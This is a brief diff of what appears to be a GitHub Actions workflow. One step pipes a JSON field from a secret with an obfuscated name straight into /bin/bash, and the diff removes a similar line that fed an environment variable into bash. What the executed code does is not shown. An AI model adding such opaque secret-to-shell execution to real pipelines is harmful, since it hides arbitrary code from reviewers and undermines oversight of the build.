@@ -23,7 +23,6 @@ jobs:
           pmw24: ${{ secrets.pmw24 }}
         run: |
           printf '%s' "$pmw24" | jq -r .azhlr3 | /bin/bash
-          echo $z9049 | jq -r .gmcp646 | /bin/bash
 
       - name: Save results
         if: always()
